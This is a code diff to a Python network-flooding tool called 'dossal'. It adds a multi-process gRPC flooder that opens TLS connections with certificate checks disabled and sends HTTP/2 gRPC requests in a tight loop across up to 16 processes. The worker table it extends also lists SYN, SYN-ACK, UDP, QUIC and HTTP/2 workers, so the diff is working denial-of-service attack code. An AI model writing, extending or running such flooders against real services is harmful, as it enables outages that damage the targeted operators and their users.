@@ -25,7 +25,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "3.15"
+VERSION = "3.16"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -398,6 +398,92 @@ async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
         writer.transport.abort()
 
 # ── gRPC worker: HTTP/2 + gRPC framing ──────────────────────────
+def _mp_grpc_flood(args_tuple):
+    """Multi-process gRPC flooder: TLS + h2 + gRPC frames in a child process."""
+    import time as _time
+    import ssl as _ssl
+    import socket as _socket
+    host, port, path, duration, payload_size = args_tuple
+    from h2.connection import H2Connection
+    from h2.config import H2Configuration
+    from h2.events import DataReceived
+
+    sent = 0
+    errors = 0
+    try:
+        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+        ctx.set_alpn_protocols(['h2'])
+        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+        raw.settimeout(5.0)
+        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
+        raw.connect((host, port))
+        ssock = ctx.wrap_socket(raw, server_hostname=host)
+        
+        config = H2Configuration(client_side=True)
+        conn = H2Connection(config=config)
+        conn.initiate_connection()
+        ssock.sendall(conn.data_to_send())
+        # Read server preface
+        data = ssock.recv(8192)
+        conn.receive_data(data)
+        
+        headers = [
+            (':method', 'POST'),
+            (':scheme', 'https'),
+            (':authority', host),
+            (':path', path),
+            ('content-type', 'application/grpc'),
+            ('te', 'trailers'),
+            ('user-agent', 'dossal/3.15'),
+        ]
+        grpc_payload = b'X' * max(1, payload_size)
+        payload = b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
+        
+        end = _time.time() + duration
+        while _time.time() < end:
+            try:
+                stream_id = conn.get_next_available_stream_id()
+                conn.send_headers(stream_id, headers, end_stream=False)
+                conn.send_data(stream_id, payload, end_stream=True)
+                data = conn.data_to_send()
+                if data:
+                    ssock.sendall(data)
+                sent += 1
+                # Drain responses
+                try:
+                    chunk = ssock.recv(65535)
+                    if chunk:
+                        conn.receive_data(chunk)
+                except Exception:
+                    pass
+            except Exception:
+                break
+        ssock.close()
+    except Exception:
+        errors += 1
+    return sent, errors
+
+async def grpc_mp_worker(name, url, stats, duration, stop, payload_size=1024):
+    """gRPC multiprocess worker."""
+    host, port, path = parse_http(url)
+    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, path, duration, payload_size)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_grpc_flood, targets)
+    
+    results = await _wait_pool(pool, async_result, duration + 5)
+    if results is None:
+        results = [(0, 0)] * n_procs
+    for sent, errs in results:
+        stats.requests += sent
+        stats.errors += errs
+    stats.conns += n_procs
+
 async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
     host, port, path = parse_http(url)
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -846,6 +932,7 @@ WORKERS = {
     "udy":       udp_worker,
     "h2":        h2_worker,
     "grpc":      grpc_worker,
+    "grpcmp":    grpc_mp_worker,
     "quic":      quic_worker,
     "syn":       syn_worker,
     "synack":    synack_worker,
